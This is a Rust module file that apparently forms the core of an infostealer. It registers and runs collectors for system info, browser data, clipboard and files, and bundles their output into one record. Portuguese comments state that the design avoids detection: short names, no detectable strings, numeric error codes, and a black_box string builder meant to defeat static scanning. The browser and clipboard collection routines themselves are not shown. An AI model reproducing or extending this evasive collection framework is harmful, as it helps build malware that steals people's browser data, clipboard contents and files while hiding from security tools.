//! Data collectors module
//!
//! ⚠️ Nomes curtos e sem strings detectáveis

#![allow(dead_code)]

pub mod system_info;
pub mod browser;
pub mod clipboard;
pub mod files;

use std::collections::HashMap;
use std::hint::black_box;
use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};
use thiserror::Error;

pub use system_info::SystemInfoCollector;
pub use browser::BrowserCollector;
pub use clipboard::ClipboardCollector;
pub use files::FileCollector;

// Helper para construir strings
#[inline(always)]
fn bs(chars: &[char]) -> String {
    let mut s = String::with_capacity(chars.len());
    for &c in chars { s.push(c); }
    black_box(s)
}

#[derive(Error, Debug)]
pub enum CollectorError {
    #[error("1")]
    NotSupported(String),
    
    #[error("2")]
    CollectionFailed(String),
    
    #[error("3")]
    IoError(#[from] std::io::Error),
    
    #[error("4")]
    SerializationError(#[from] serde_json::Error),
    
    #[error("5")]
    UnknownModule(String),
}

pub trait Collector: Send + Sync {
    fn name(&self) -> &str;
    fn collect(&self) -> Result<ModuleData, CollectorError>;
    fn is_supported(&self) -> bool;
    fn priority(&self) -> u8 { 50 }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CollectedData {
    #[serde(rename = "t")]
    pub timestamp: DateTime<Utc>,
    #[serde(rename = "s")]
    pub session_id: String,
    #[serde(rename = "m")]
    pub modules: HashMap<String, ModuleData>,
    #[serde(rename = "x")]
    pub metadata: CollectionMetadata,
}

impl CollectedData {
    pub fn new() -> Self {
        Self {
            timestamp: Utc::now(),
            session_id: uuid::Uuid::new_v4().to_string(),
            modules: HashMap::new(),
            metadata: CollectionMetadata::default(),
        }
    }
    
    pub fn add_module(&mut self, name: String, data: ModuleData) {
        self.modules.insert(name, data);
    }
}

impl Default for CollectedData {
    fn default() -> Self {
        Self::new()
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct CollectionMetadata {
    #[serde(rename = "d")]
    pub duration_ms: u64,
    #[serde(rename = "r")]
    pub modules_run: u32,
    #[serde(rename = "s")]
    pub modules_success: u32,
    #[serde(rename = "e")]
    pub errors: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "t")]
pub enum ModuleData {
    #[serde(rename = "s")]
    System(system_info::SystemData),
    #[serde(rename = "b")]
    Browser(browser::BrowserData),
    #[serde(rename = "c")]
    Clipboard(clipboard::ClipboardData),
    #[serde(rename = "f")]
    Files(files::FileData),
    #[serde(rename = "g")]
    Generic(serde_json::Value),
}

pub struct CollectorManager {
    collectors: Vec<Box<dyn Collector>>,
}

impl CollectorManager {
    pub fn new() -> Self {
        Self { collectors: Vec::new() }
    }
    
    pub fn register_module(&mut self, name: &str) -> Result<(), CollectorError> {
        // Usa códigos curtos ao invés de nomes legíveis
        let collector: Box<dyn Collector> = match name.to_lowercase().as_str() {
            "system" | "s" => Box::new(SystemInfoCollector::new()),
            "browser" | "b" => Box::new(BrowserCollector::new()),
            "clipboard" | "c" => Box::new(ClipboardCollector::new()),
            "files" | "f" => Box::new(FileCollector::new()),
            _ => return Err(CollectorError::UnknownModule(name.len().to_string())),
        };
        
        if collector.is_supported() {
            self.collectors.push(collector);
        }
        
        Ok(())
    }
    
    pub fn collector_count(&self) -> usize {
        self.collectors.len()
    }
    
    pub async fn run_all(&self) -> Result<CollectedData, CollectorError> {
        let start = std::time::Instant::now();
        let mut collected = CollectedData::new();
        let mut errors = Vec::new();
        
        let mut collectors: Vec<_> = self.collectors.iter().collect();
        collectors.sort_by(|a, b| b.priority().cmp(&a.priority()));
        
        for collector in collectors {
            match collector.collect() {
                Ok(data) => {
                    collected.add_module(collector.name().to_string(), data);
                    collected.metadata.modules_success += 1;
                }
                Err(_) => {
                    // Código de erro numérico ao invés de mensagem
                    errors.push(format!("{}", collected.metadata.modules_run));
                }
            }
            collected.metadata.modules_run += 1;
        }
        
        collected.metadata.duration_ms = start.elapsed().as_millis() as u64;
        collected.metadata.errors = errors;
        
        Ok(collected)
    }
}

impl Default for CollectorManager {
    fn default() -> Self {
        Self::new()
    }
}
